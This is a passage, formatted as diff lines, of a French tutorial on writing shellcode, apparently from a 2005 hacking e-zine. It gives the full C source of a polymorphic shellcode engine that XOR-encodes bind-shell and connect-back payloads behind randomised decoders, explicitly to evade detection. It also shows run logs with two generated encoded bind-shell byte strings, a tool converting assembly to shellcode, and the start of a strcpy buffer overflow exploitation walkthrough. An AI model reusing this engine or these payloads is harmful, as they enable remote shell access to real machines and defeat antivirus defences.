+      if (((junk == 0) && (random() % 2)) ||
+	  (junk == 0 && i == TAB_INIT - 1))
+	init_junk(env, &junk);
+    }
+  if (env->reg == 0)
+    printf("size = %d, reg = EBX, key = %d\n", env->size, env->key);
+  else
+    printf("size = %d, reg = EDX, key = %d\n", env->size, env->key);
+}
+
+
+
+
+
+#########################################
+#                                       #
+#           build_loop.c                #
+#                                       #
+#########################################
+
+/*
+** build_loop.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 22:01:55 2005 eee
+** Last update Tue Apr 12 22:03:45 2005 eee
+*/
+
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <pse.h>
+
+extern t_tab	gl_loop[];
+extern t_tab	gl_junk1[];
+extern t_tab	gl_junk2[];
+
+void	build_loop(t_env *env)
+{
+  memcpy(env->decrypt++, &gl_loop[0].op, 1);
+  printf("%s\n",gl_loop[0].desc);
+  env->decrypt = step1(env->decrypt);
+  env->decrypt = step2(env->decrypt, env->reg);
+  env->decrypt = step3(env->decrypt);
+  memcpy(env->decrypt, &gl_loop[11].op, 2);
+  printf("%s\n",gl_loop[11].desc);
+}
+
+/*lodsb + junk ou mov al, esi + inc esi*/
+char	*step1(char *decrypt)
+{
+  int	rnd;
+
+  if (random() % 2)
+    {
+      memcpy(decrypt++, &gl_loop[1].op, 1);
+      rnd = random() % TAB_JUNK2;
+      memcpy(decrypt, &gl_junk2[rnd].op, 2);
+      decrypt += 2;
+      printf("%s\n%s\n",gl_loop[1].desc, gl_junk2[rnd].desc);
+    }
+  else
+    {
+      memcpy(decrypt, &gl_loop[2].op, 2);
+      decrypt += 2;
+      memcpy(decrypt++, &gl_loop[3].op, 2);
+      printf("%s\n%s\n",gl_loop[2].desc, gl_loop[3].desc);
+    }
+  return (decrypt);
+}
+
+/* xor al, reg8 + inc reg8  */
+char	*step2(char *decrypt, int reg)
+{
+  if (reg == 0)
+    {
+      memcpy(decrypt, &gl_loop[4].op, 2);
+      decrypt += 2;
+      memcpy(decrypt, &gl_loop[6].op, 2);
+      decrypt += 2;
+      printf("%s\n%s\n",gl_loop[4].desc, gl_loop[6].desc);
+    }
+  else
+    {
+      memcpy(decrypt, &gl_loop[5].op, 2);
+      decrypt += 2;
+      memcpy(decrypt, &gl_loop[7].op, 2);
+      decrypt += 2;
+      printf("%s\n%s\n",gl_loop[5].desc, gl_loop[7].desc);
+    }
+  return (decrypt);
+}
+
+/*  mov edi, al + inc edi ou stosb + junk */
+char	*step3(char *decrypt)
+{
+  int	rnd;
+
+   if (random() % 2)
+    {
+      memcpy(decrypt, &gl_loop[8].op, 2);
+      decrypt += 2;
+      memcpy(decrypt++, &gl_loop[9].op, 1);
+      printf("%s\n%s\n",gl_loop[8].desc, gl_loop[9].desc);
+    }
+  else
+    {
+      memcpy(decrypt++, &gl_loop[10].op, 1);
+      rnd = random() % TAB_JUNK2;
+      memcpy(decrypt, &gl_junk2[rnd].op, 2);
+      decrypt += 2;
+      printf("%s\n%s\n",gl_loop[10].desc, gl_junk2[rnd].desc);
+    }
+   return (decrypt);
+}
+
+
+
+
+#########################################
+#                                       #
+#              gl_tab.c                 #
+#                                       #
+#########################################
+
+/*
+** gl_tab.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 15:59:11 2005 eee
+** Last update Mon Apr 18 14:10:17 2005 eee
+*/
+
+#include <pse.h>
+
+/* Tableau pour le delta offset */
+t_tab	gl_delta[]=
+  {
+    {0, 0x005D06EB, "JMP SHORT XX\nPOP EBP"},
+    {1, 0x000007EB, "JMP SHORT XX"},
+    {2, 0xFFFFF5E8, "CALL XXXXXXXX"},
+    {3, 0x000000FF, ""}
+  };
+
+/* Tableau des 4 instructions d'initialisation */
+/* NOTE : ADD EBP, xx doit rester la derniere dans le tableau et ne pas */
+/* etre comptee dans TAB_INIT */
+t_tab	gl_init[]=
+  {
+    {0, 0x0000EE89, "MOV ESI, EBP"},
+    {1, 0x0000EF89, "MOV EDI, EBP"},
+    {2, 0x00B1C931, "XOR ECX, ECX\nMOV CL, 'size'"},
+    {3, 0x00000031, "XOR reg, reg\nMOV reg8, 'key'"},
+    {4, 0x0000c583, "ADD EBP, xx"}
+  };
+
+t_tab	gl_loop[]=
+  {
+    {0, CLD,		"CLD"},
+    {1, LODSB,		"LODSB"},
+    {2, MOV_AL_ESI,	"MOV AL, [ESI]"},
+    {3, INC_ESI,       	"INC ESI"},
+    {4, XOR_AL_BL,	"XOR AL, BL"},
+    {5, XOR_AL_DL,	"XOR AL, DL"},
+    {6, INC_BL,		"INC BL"},
+    {7, INC_DL,		"INC DL"},
+    {8, MOV_EDI_AL,	"MOV [EDI], AL"},
+    {9, INC_EDI,       	"INC EDI"},
+    {10, STOSB,		"STOSB"},
+    {11, LOOP,		"LOOP"}
+  };
+
+/* Premier tableau (pour le init) de junk sur 1 bytes */
+t_tab	gl_junk1[]=
+  {
+    {0, 0x90, "NOP"},
+    {1, 0x40, "INC EAX"},
+    {2, 0x48, "DEC EAX"},
+    {3, 0xF8, "CLC"},
+    {4, 0xFD, "CLD"},
+    {5, 0xF5, "CMC"}
+  };
+
+/* Tableau 'universel' de junk sur 2 bytes */
+t_tab	gl_junk2[]=
+  {
+    {0,  0x5850, "PUSH EAX\nPOP EAX"},
+    {1,  0x5B53, "PUSH EBX\nPOP EBX"},
+    {2,  0x5951, "PUSH ECX\nPOP ECX"},
+    {3,  0x5A52, "PUSH EDX\nPOP EDX"},
+    {4,  0x4048, "DEC EAX\nINC EAX"},
+    {5,  0x434B, "DEC EBX\nINC EBX"},
+    {6,  0x4149, "DEC ECX\nINC ECX"},
+    {7,  0x424A, "DEC EDX\nINC EDX"},
+    {8,  0xDB87, "XCHG EBX, EBX"},
+    {9,  0xC987, "XCHG ECX, ECX"},
+    {10, 0xD287, "XCHG EDX, EDX"},
+    {11, 0xC089, "MOV EAX, EAX"},
+    {12, 0xDB89, "MOV EBX, EBX"},
+    {13, 0xC989, "MOV ECX, ECX"},
+    {14, 0xD289, "MOV EDX, EDX"}
+  };
+
+t_sh	gl_sh[]=
+  {
+    {0, 0x17, -1, "./shellcode/linux/bind.bin", "linux : Bind shell."},
+    {1, 0x18, 0x12, "./shellcode/linux/connect.bin", "linux : Connect back."},
+    {2, 1, -1, "./shellcode/bsd/bind.bin", "pas dispo"},
+    {3, 1, 1, "./shellcode/bsd/connect.bin", "pas dispo"},
+    {4, 0, 0, 0, 0}
+  };
+
+
+#########################################
+#                                       #
+#              load_sh.c                #
+#                                       #
+#########################################
+
+/*
+** load_sh.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 16:56:57 2005 eee
+** Last update Mon Apr 18 14:09:14 2005 eee
+*/
+
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <pse.h>
+
+extern t_sh	gl_sh[];
+
+void		crypt_sh(t_env *env)
+{
+  int		i;
+  unsigned char	key;
+
+  key = env->key; 
+  for (i = 0; i < env->size; i++)
+    {
+      env->shellcode[i] ^= key++;
+      if (env->shellcode[i] == 0)
+	{
+	  printf("Invalid key, sorry it's an evil bug\n");
+	  exit(1);
+	}
+    }
+}
+
+void	check_key(t_env *env, char *desc)
+{
+  char	key;
+  char	save;
+  char	tmp;
+  int	i;
+
+  printf("\n[-] Recherche d'une cle pour -> %s\n", desc);
+  key = (random() % 255) + 1;
+  save = key;
+  while (1)
+  {
+    tmp = key;
+    for (i = 0; i < env->size; i++, tmp++)
+      {
+	if (tmp == env->shellcode[i])
+	  break;
+      }
+    if (i != env->size)
+      {
+	key++;
+	if (key == save)
+	  {
+	    printf("invalid shellcode\n");
+	    exit(1);
+	  }
+	if (key == 0)
+	  key++;
+      }
+    else
+      break;
+  }
+  env->key = key;
+  printf("key = %d\n", env->key);
+}
+
+void	patch_sh(t_env *env)
+{
+  char	*ptr;
+  if (gl_sh[env->sh].off_port != -1)
+    {
+      ptr = env->shellcode;
+      ptr += gl_sh[env->sh].off_port;
+      memcpy (ptr, &env->port, 2);
+    }
+  if (gl_sh[env->sh].off_ip != -1)
+    {
+      ptr = env->shellcode;
+      ptr += gl_sh[env->sh].off_ip;
+      memcpy (ptr, &env->ip, 4);
+    }
+}
+
+void		load_sh(t_env *env, char *sh)
+{
+  int		fd;
+  struct stat	st;
+
+  fd = xopen(sh, O_RDWR, 0);
+  if ((fstat(fd, &st)) != 0)
+    {
+      perror("fstat");
+      exit(1);
+    }
+  if ((env->shellcode = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE,
+			MAP_PRIVATE, fd, 0)) == MAP_FAILED)
+  {
+      perror("mmap");
+      exit(1);
+    }
+  close(fd);
+  env->size = st.st_size;
+  patch_sh(env);
+}
+
+
+#########################################
+#                                       #
+#               main.c                  #
+#                                       #
+#########################################
+
+/*
+** main.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 15:54:13 2005 eee
+** Last update Mon Apr 18 14:02:40 2005 eee
+*/
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <time.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <pse.h>
+
+extern t_sh	gl_sh[];
+
+void	build_poly(t_env *env)
+{
+  int	size;
+
+  size = sizeof(char) * (DECRYPT_MAX_SIZE + 1);
+  env->save = xmalloc(size);
+  env->decrypt = env->save;
+  bzero(env->decrypt, size);
+  printf("\n[-] Generation : calcul delta offset :\n");
+  build_delta(env);
+  printf("\n[-] Generation : initialisation de la boucle :\n");
+  build_init(env);
+  printf("\n[-] Generation : boucle :\n");
+  env->decrypt += strlen(env->decrypt);
+  build_loop(env);
+}
+
+int	help()
+{
+  int	i;
+
+  printf("\n./pse [shellcode number] [port] [ip]\n\n");
+  printf("shellcode list : \n");
+  for (i = 0; gl_sh[i].sh; i++)
+    printf("%d - %s\n", gl_sh[i].nb, gl_sh[i].desc);
+  printf("\n\n");
+  exit(0);
+}
+
+void	check_arg(int ac, char **av, t_env *env)
+{
+  if (ac > 1)
+    {
+      if ((strcmp(av[1], "-h")) == 0)
+	help();
+      else if (atoi(av[1]) > -1 && atoi(av[1]) < MAX_SH)
+	env->sh = atoi(av[1]);
+      if (ac > 2)
+	env->port = htons(atoi(av[2]));
+      else
+	env->port = htons(DEFAULT_PORT);
+      if (ac > 3)
+	env->ip = inet_addr(av[3]);
+      else
+	env->ip = inet_addr(DEFAULT_IP);
+    }
+}
+
+int	main(int ac, char **av)
+{
+  t_env	env;
+
+  printf("%s\n", BANNER);
+  env.sh = 0;
+  check_arg(ac, av, &env);
+  srandom(time(0) * getpid());
+  load_sh(&env, gl_sh[env.sh].sh);
+  //write(1,env.shellcode, env.size);
+  //exit(0);
+  check_key(&env, gl_sh[env.sh].desc);
+  crypt_sh(&env);
+  build_poly(&env);
+  write_shellcode(&env);
+  return (0);
+}
+
+
+
+
+#########################################
+#                                       #
+#             write_sh.c                #
+#                                       #
+#########################################
+
+
+/*
+** write_sh.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 17:35:11 2005 eee
+** Last update Fri Apr 15 00:39:58 2005 eee
+*/
+
+#include <sys/mman.h>
+#include <fcntl.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <pse.h>
+
+void	write_spe(char *decrypt, char *shellcode)
+{
+  int	fd;
+  int	size;
+
+  fd = xopen(DEFAULT_PSE, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+  size = strlen(decrypt);
+  if ((write(fd, decrypt, size)) != size)
+    perror("WARNING -> write");
+  size = strlen(shellcode);
+  if ((write(fd, shellcode, size)) != size)
+    perror("WARNING -> write");
+  printf("\nSortie binaire dans : %s\n",DEFAULT_PSE);
+  close(fd);
+}
+
+char	*write_c_decrypt(char *decrypt, char *buf)
+{
+  int	i;
+
+  for(i = 0; decrypt[i]; i++)
+    {
+      if ((i != 0) && ((i % LEN_SH_TAB) == 0))
+	{
+	  sprintf(buf,"\"\n\"");
+	  buf += 3;
+	}
+      sprintf(buf, "\\x%02x",(unsigned char)decrypt[i]);
+      buf += 4;
+    }
+  sprintf(buf, "\"\n\"");
+  buf += 3;
+  return (buf);
+}
+
+void	write_c_shellcode(char *shellcode, char *buf)
+{
+  int	i;
+
+  for(i = 0; shellcode[i]; i++)
+    {
+      if ((i != 0) && ((i % LEN_SH_TAB) == 0))
+	{
+	  sprintf(buf,"\"\n\"");
+	  buf += 3;
+	}
+      sprintf(buf, "\\x%02x",(unsigned char)shellcode[i]);
+      buf += 4;
+    }
+  sprintf(buf, "\";\n\n");
+
+}
+
+void	write_c(char *decrypt, char *shellcode)
+{
+  char	*buf;
+  char	*save;
+  int	size;
+  int	fd;
+  int	i;
+
+  fd = xopen(DEFAULT_C, O_WRONLY | O_CREAT | O_TRUNC, 0600);
+  size = sizeof(char) * (strlen(decrypt) + strlen(shellcode));
+  size += (size / LEN_SH_TAB);
+  size *= 4;
+  size += strlen(C_SH) + 3;
+  buf = xmalloc(size);
+  save = buf;
+  sprintf(buf, "%s", C_SH);
+  buf += strlen(buf);
+  buf = write_c_decrypt(decrypt, buf);
+  write_c_shellcode(shellcode, buf);
+  size = strlen(save);
+  if ((write(fd, save, size)) != size)
+    perror("WARNING -> write");
+  printf("Sortie texte dans : %s\n\n",DEFAULT_C);
+  free(save);
+}
+
+void	write_shellcode(t_env *env)
+{
+  write_spe(env->save, env->shellcode);
+  write_c(env->save, env->shellcode);
+  free(env->save);
+  munmap(env->shellcode, env->size);
+}
+
+
+#########################################
+#                                       #
+#          xmalloc.c                #
+#                                       #
+#########################################
+
+/*
+** xmalloc.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 22:35:03 2005 eee
+** Last update Tue Apr 12 22:35:13 2005 eee
+*/
+
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+void	*xmalloc(int size)
+{
+  void	*ptr;
+  char	*rst;
+
+  if ((ptr = malloc(size)) == 0)
+    {
+      perror("malloc");
+      exit(1);
+    }
+  rst = ptr;
+  while (size)
+    rst[--size] = 0;
+  return (ptr);
+}
+
+
+#########################################
+#                                       #
+#               xopen.c                 #
+#                                       #
+#########################################
+
+/*
+** xopen.c for Polymorphic Shellcode Engine project
+** 
+** Made by eee
+** 
+** Started on  Tue Apr 12 16:58:41 2005 eee
+** 
+
+Last update Tue Apr 12 16:59:21 2005 eee
+*/
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdio.h>
+
+int	xopen(char *str, int flags, int mode)
+{
+  int	fd;
+
+  if ((fd = open(str, flags, mode)) < 0)
+    {
+      
+
+perror("open");
+      exit(1);
+    }
+  return (fd);
+}
+
+
+
+	---[ 10 ]   Exemple avec PSE.
+
+Dans cette partie, on démontre seulement par des exemples la génération totalement
+différente de shellcodes. Seul le bind shellcode sera expliqué, pas la peine de 
+faire du remplissage de choses évidentes, 
+
+	[bleyme@localhost pse]$ tar xfzv pse.tar.gz
+	pse/
+	pse/shellcode/
+	pse/shellcode/linux/
+	pse/shellcode/linux/bak.bind
+	pse/shellcode/linux/bind
+	pse/shellcode/bsd/
+	pse/header/
+	pse/header/pse.h
+	pse/header/pse.h~
+	pse/src/
+	pse/src/load_sh.c
+	pse/src/xmalloc.c
+	pse/src/build_loop.c
+	pse/src/xopen.c
+	pse/src/Makefile
+	pse/src/build_init.c
+	pse/src/main.c
+	pse/src/gl_tab.c
+	pse/src/write_sh.c
+	pse/src/build_delta.c
+	pse/Makefile
+
+	[bleyme@localhost pse]$ ls
+	pse/  pse.tar.gz
+	[bleyme@localhost pse]$ cd pse
+
+	[bleyme@localhost pse]$ make
+	Building The Most Er0tic Polymorphic Shellcode Engine
+	make[1]: Entering directory `/home/bleyme/Desktop/taff/pse/pse/src'
+	cc -g -W -I../header/   -c -o main.o main.c
+	cc -g -W -I../header/   -c -o load_sh.o load_sh.c
+	cc -g -W -I../header/   -c -o build_delta.o build_delta.c
+	cc -g -W -I../header/   -c -o build_init.o build_init.c
+	cc -g -W -I../header/   -c -o build_loop.o build_loop.c
+	cc -g -W -I../header/   -c -o write_sh.o write_sh.c
+	cc -g -W -I../header/   -c -o gl_tab.o gl_tab.c
+	cc -g -W -I../header/   -c -o xmalloc.o xmalloc.c
+	cc -g -W -I../header/   -c -o xopen.o xopen.c
+	gcc -o pse main.o load_sh.o build_delta.o build_init.o build_loop.o write_sh.o gl_tab.o xmalloc.o xopen.o
+	make[1]: Leaving directory `/home/bleyme/Desktop/taff/pse/pse/src'
+
+	[bleyme@localhost pse]$
+
+
+PSE génère un shellcode à chaque fois entierement différent, ceci grâce à son decoder, on le
+lance donc en appellant un bind shellcode par le port 1234.
+
+	[bleyme@localhost Desktop]$ ./pse 0 1234
+
+	     @@@
+	    @. .@
+	    @\=/@
+	    .- -.
+	   /(. .)\
+	   \ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine
+	   '( v )`     version 0.01b
+	     \|/
+	     (|)
+	     '-`
+
+	[-] Recherche d'une cle pour -> linux : Bind shell.
+	key = 147
+
+	[-] Generation : calcul delta offset :
+	JMP SHORT XX
+	POP EBP
+	CLC
+	JMP SHORT XX
+	PUSH EAX
+	POP EAX
+	CALL XXXXXXXX
+	DEC EAX
+	DEC EBX
+	INC EBX
+
+	[-] Generation : initialisation de la boucle :
+	ADD EBP, xx
+	INC EAX
+	MOV EDI, EBP
+	PUSH EBX
+	POP EBX
+	XCHG EDX, EDX
+	XOR reg, reg
+	MOV reg8, 'key'
+	MOV ESI, EBP
+	XCHG EBX, EBX
+	XOR ECX, ECX
+	MOV CL, 'size'
+	size = 92, reg = EDX, key = 147
+
+	[-] Generation : boucle :
+	CLD
+	LODSB
+	XCHG EDX, EDX
+	XOR AL, DL
+	INC DL
+	STOSB
+	PUSH EAX
+	POP EAX
+	LOOP
+
+	Sortie binaire dans : shellcode.bin
+	Sortie texte dans : shellcode.c
+
+
+Ici, on peut voir la clef aléatoire, elle est de 147 bytes.
+Ceci était le decrypteur ou decoder, grâce à lui nous avons un shellcode totalement
+polymorphique, jamais ce shellcode ne se reproduira de la même manière.
+
+
+	[bleyme@localhost Desktop]$ cat shellcode.c
+
+	char shellcode[]=
+	"\xeb\x06\x5d\xf8\xeb\x07\x50\x58\xe8\xf5\xff\xff\xff\x4b\x43"
+	"\x48\x83\xc5\x26\x26\x89\xef\x53\x5b\x87\xd2\x31\xd2\xb2\x93"
+	"\x89\xee\x87\xdb\x31\xc9\xb1\x5c\xfc\xac\x87\xd2\x30\xd0\xfe"
+	"\xc2\xaa\x50\x58\xe2\xf4"
+	"\xa2\x54\x0c\x26\xf1\xca\xdb\xc8\xd9\xce\x14\x7f\xf5\xa1\xfa"
+	"\x6f\x23\x2d\x62\x3f\xf5\xce\xc1\xae\x79\xef\xcb\xfd\x26\x51"
+	"\xdb\xa2\xe2\xe4\x3c\x57\x07\xde\x74\x3a\x0b\xda\x0e\xba\x72"
+	"\x40\x91\x95\x4a\x25\x86\x76\xa1\x05\x49\xfb\x02\x7d\xce\x5d"
+	"\x86\x60\xee\x1f\x53\x51\x1c\xa3\x20\xe9\x19\x6a\xd0\x8d\xb5"
+	"\xf1\xf0\x93\x89\x8a\xcc\x86\x8c\x88\x6e\x0b\xb8\xb9\x62\x0d"
+	"\x20\x6e";
+
+
+Pour vous le prouvez, on va en remettre une couche, vous verrez, même shellcode, même
+port, le shellcode reste toujours le même dans son executer mais est totalement différent
+sous sa forme.
+
+
+	[bleyme@localhost Desktop]$ ./pse 0 1234
+
+
+	     @@@
+	    @. .@
+	    @\=/@
+	    .- -.
+	   /(. .)\
+	   \ ).( /     PSE : The most er0tic Polymorphic Shellcode Engine
+	   '( v )`     version 0.01b
+	     \|/
+	     (|)
+	     '-`
+
+	[-] Recherche d'une cle pour -> linux : Bind shell.
+	key = 146
+
+	[-] Generation : calcul delta offset :
+	JMP SHORT XX
+	POP EBP
+	CMC
+	JMP SHORT XX
+	DEC EAX
+	INC EAX
+	CALL XXXXXXXX
+	DEC EAX
+	DEC EAX
+	INC EAX
+
+	[-] Generation : initialisation de la boucle :
+	ADD EBP, xx
+	CLD
+	MOV EDI, EBP
+	DEC EDX
+	INC EDX
+	XOR ECX, ECX
+	MOV CL, 'size'
+	XCHG ECX, ECX
+	XOR reg, reg
+	MOV reg8, 'key'
+	MOV ESI, EBP
+	MOV ECX, ECX
+	size = 92, reg = EBX, key = 146
+
+	[-] Generation : boucle :
+	CLD
+	MOV AL, [ESI]
+	INC ESI
+	XOR AL, BL
+	INC BL
+	MOV [EDI], AL
+	INC EDI
+	LOOP
+
+	Sortie binaire dans : shellcode.bin
+	Sortie texte dans : shellcode.c
+
+
+Une autre clef a été utilisée, vous remarquerez que, comme expliqué plus haut, le decoder
+est entierement different, soit le code change soit les instructions changent juste de
+place, chose qui suffit pour être undetect. On "cat" le shellcode pour voir sa différence.
+
+	[bleyme@localhost Desktop]$ cat shellcode.c
+
+	char shellcode[]=
+	"\xeb\x06\x5d\xf5\xeb\x07\x48\x40\xe8\xf5\xff\xff\xff\x48\x40"
+	"\x48\x83\xc5\x26\x26\x89\xef\x4a\x42\x31\xc9\xb1\x5c\x87\xc9"
+	"\x31\xdb\xb3\x92\x89\xee\x89\xc9\xfc\x8a\x06\x46\x30\xd8\xfe"
+	"\xc3\x88\x07\x47\xe2\xf4"
+	"\xa3\x53\x0d\x25\xf0\xc5\xda\xcb\xd8\xc9\x15\x7c\xf4\x9e\xfb"
+	"\x6c\x22\x2a\x63\x3c\xf4\xc1\xc0\xad\x78\xe8\xca\xfe\x27\x4e"
+	"\xda\xa1\xe3\xe3\x3d\x54\x06\xd1\x75\x39\x0a\xdd\x0f\xb9\x73"
+	"\x3f\x90\x96\x4b\x22\x87\x75\xa0\x0a\x48\xf8\x03\x7a\xcf\x5e"
+	"\x87\x7f\xef\x1c\x52\x56\x1d\xa0\x21\xe6\x18\x69\xd1\x8a\xb4"
+	"\xf2\xf1\xac\x88\x89\xcd\x81\x8d\x8b\x6f\x04\xb9\xba\x63\x0a"
+	"\x21\x6d";
+
+
+Vous avez de même un shellcode.bin qui a été généré, c'est carrément le binaire.
+ici, vous placez vos shellcodes avec le bon nom, et le bon endroit. Vous pourrez ainsi
+les encoder à votre tour :
+[gl_tab.c] --
+             |
+
+  {
+    {0, 0x17, -1, "./shellcode/linux/bind.bin", "linux : Bind shell."},
+    {1, 0x18, 0x12, "./shellcode/linux/connect.bin", "linux : Connect back."},
+    {2, 1, -1, "./shellcode/bsd/bind.bin", "pas dispo"},
+    {3, 1, 1, "./shellcode/bsd/connect.bin", "pas dispo"},
+    {4, 0, 0, 0, 0}
+  };
+
+
+
+	---[ 11 ]   technics & methods
+
+Dans cette partie, on va voir clairement et simplement quelques méthodes utiles pour 
+faire/réparer des shellcodes. Dans un premier temps, vous devez impérativement ne pas
+faire de null bytes comme le mkdir-shellcode plus haut. Si vous désirez injecter un 
+shellcode dans un buffer, votre shellcode ne doit impérativement ne pas contenir de
+null byte : 0x00.
+
+
+
+Vous voulez mettre de l'asm (un shellcode par exemple) dans du C ? rien de plus facile :
+
+	void main() 
+	{
+		__asm__(" CODE ASSEMBLEUR ");
+	}
+
+
+
+
+Ici, c'est une partie bien sympathique de l'article puisque nous allons voir les 
+méthodes pour enlever les null bytes, pour forger directement des shellcodes, des
+petits tools ou techniques qui peuvent etre tres pratique pour tout shellcoder.
+
+
+
+Vous vous souvenez quand on s'amusait à recopier les instructions que nous donnait 
+objdump pour en faire un shellcode ? Eh bien TESO a mis en place un petit tool bien
+pratique pour ne pas se fatiguer (même s'il faut avouer ça n'a rien de fatiguant :p).
+Il s'agit d'outp.c, c'est un petit programme qui convertit un .s en un shellcode par typo/teso 
+
+
+---------------------------------------------------------------
+#include <stdio.h>
+/* 
+
+     convert .s to shellcode. typo/teso (typo@inferno.tusculum.edu)
+
+$ cat lala.s
+.globl cbegin
+.globl cend
+cbegin:
+        xorl %eax, %eax
+  ...
+cend:
+$ gcc -Wall lala.s outp.c -o lala
+$ ./lala
+unsigned char shellcode[] =
+"\x31\xc0\x31\xdb\x31\xc9\xb3\x0f\xb1\x0f\xb0\x47\xcd\x80\xeb\x1e\x5b"
+"\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\x8d\x4b\x08\x8d\x53\x0c"
+"\xb0\x0b\xcd\x80\x89\xc3\x31\xc0\xb0\x01\xcd\x80\xe8\xdd\xff\xff\xff"
+"\x2f\x74\x6d\x70\x2f\x74\x73\x74\x65\x73\x6f\x63\x72\x65\x77\x21\x21";
+...
+
+*/
+
+extern void     cbegin();
+extern void     cend();
+
+int main() {
+    char *buf = (char *) cbegin;
+    int i = 0, x = 0;
+
+    printf("unsigned char shellcode[] = \n\"");
+    for (; (*buf) && (buf < (char *) cend); buf++) {
+        if (i++ == 17) i = 1;
+        if (i == 1 && x != 0) printf("\"\n\""); 
+        x = 1;
+        printf("\\x%02x", (unsigned char) *buf);
+    }
+    printf("\";\n");
+
+printf("
+int main() {
+    void (*f)();
+    f = (void *) shellcode;
+    printf(\"%%d\\n\", strlen(shellcode));
+    f();
+}
+");
+
+    return(0);
+}
+
+
+
+---------------------------------------------------------------
+
+Il s'utilise comme le dit le code comme ceci :
+$ gcc -Wall lala.s outp.c -o lala
+
+Dans votre code assembleur, vous ne pouvez pas utiliser de null byte, pour que
+votre shellcode puisse être fonctionnel, alors à la place d'utiliser par 
+exemple :
+
+	mov eax, 00h
+
+Vous devez utiliser :
+
+	mov eax, 01h
+	dec eax
+
+Mais plus simplement, pour éviter les null bytes (00), il faut réussir à mettre de côté
+les valeurs numériques en privilégiant les registres
+
+
+
+	---[ 12 ]   annexe - buffer overflow exploitation.
+
+Etant donné que cet article traite sur les shellcodes, et que les shellcodes sont très 
+souvent associés à l'exploitation de vuln-dev, j'ai trouvé bon de faire une petite
+parenthèse sur l'exploitation de buffer overflow sous linux. Ceci sera bref, ça me 
+permettra de vous montrer que mon générateur d'exploit fonctionne bien, peut etre 
+qu'un article sortira à son sujet. Ca va clarifier les choses sur la recherche de :
+
+- l'offset.
+- l'addresse de retour.
+- le buffer.
+- Ecraser EIP.
+
+Mais d'abord une breve présentation théorique d'un probleme de stack overflow :
+On va faire un exemple pratique de l'utilisation du shellcode, si pour vous ces
+techniques sont nouvelles, meme si elles commencent vraiment à se répandre, lisez
+tout avec attention, et lisez les articles de références que je spécifierai dans
+"références."
+Voici un code qui va nous expliquer ce qu'il se passe sur la pile :
+
+
+
+void function(char *str);
+{
+	char buffer[10];
+	strcpy(buffer,str);
+}
+
+void main()
+{
+	char large_str[255]; int i;
+	for (i=0;i<255;i++) large_str[i] = 'N';
+	function(large_str)
+}
+
+Alors que va t'il se passer et quelle fonction va avoir le shellcode ?
+Voici un schéma explicatif :
+
+
+ ----------------------------------------
+| Buffer    | sfp | ret | str | Mémoire  |
+ ----------------------------------------
+| SSSSSSSSS | SSS | SSS | SSS | SSSSSSSS |
+ ----------------------------------------
+
+Le but est alors de : 
+- remplacer RET
+- Executer /bin/sh
+- Changer l'adresse de retour des instructions
+- Trouver l'adresse du shellcode
+
+Ceci était juste une petite présentation, pour voir un peu ce qu'il se passe, passons à ce 
+qui me semble être le plus important : La pratique.
+On va examiner de près un petit code. Très simple. Et le problème se trouve dans la célèbre
+fonction strcpy() qui ne vérifie aucune limite en taille de copie.
+Cette fonction copie la chaine de caractère dans le buffer(tampon).
+
+
+	[bleyme@localhost Desktop]$ cat vuln1.c
+
+	#include <stdio.h>
+	int main(int argc, char **argv)
+		{
+
+	char buffer[200];
+	if(argc>1)
+	strcpy(buffer,argv[1]);
+	printf("vuln1 : buffer overflow\n");
+	
+		} 
+
+
+On va alors de suite le compiler :
+
+
+	[bleyme@localhost Desktop]$ gcc -o vuln1 vuln1.c
+	[bleyme@localhost Desktop]$ 
+
+	[bleyme@localhost Desktop]$ ls
+	sploit.pl  vuln1 vuln1.c
+
+Qu'est-ce qui va être important pour coder un exploit ?
+Trouver son buffer vuln, son adresse de retour, et le shellcode, nous allons
+d'ailleurs mettre un shellcode généré avec PSE, il ouvre le port super leet :
+1337, on lancera l'exploit, qui nous donnera un accès /bin/sh, et qui par la 
+suite attendra, nous nous connecterons d'un autre shell ou nous pourrons faire
+n'importe quoi.
+
+Déjà, que fait ce programme si on lui insère pleins de "a" ?
+
+	[bleyme@localhost Desktop]$ ./vuln1
+	vuln1 : buffer overflow
+
+
+	[bleyme@localhost Desktop]$ ./vuln1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	vuln1 : buffer overflow
+
+	[bleyme@localhost Desktop]$ ./vuln1 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
